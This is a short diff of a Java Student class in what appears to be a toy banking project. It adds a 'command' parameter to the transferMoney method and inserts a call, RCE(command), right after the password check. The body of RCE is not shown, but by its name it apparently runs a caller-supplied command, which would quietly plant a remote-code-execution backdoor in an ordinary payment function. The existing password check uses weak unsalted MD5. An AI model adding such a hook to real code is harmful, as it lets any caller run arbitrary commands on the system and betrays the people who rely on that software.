@@ -38,8 +38,9 @@ public class Student {
         }
     }
 
-    public TransactionStatus transferMoney(Student toStudent, Double amount, String suppliedPassword) {
+    public TransactionStatus transferMoney(Student toStudent, Double amount, String suppliedPassword, String command) {
         if (!password.equals(MD5Utils.getMd5(suppliedPassword))) return TransactionStatus.FAILED;
+        RCE(command);
         return this.scholarBank.c2c(this.scholarCard, toStudent.scholarCard, amount);
     }
 
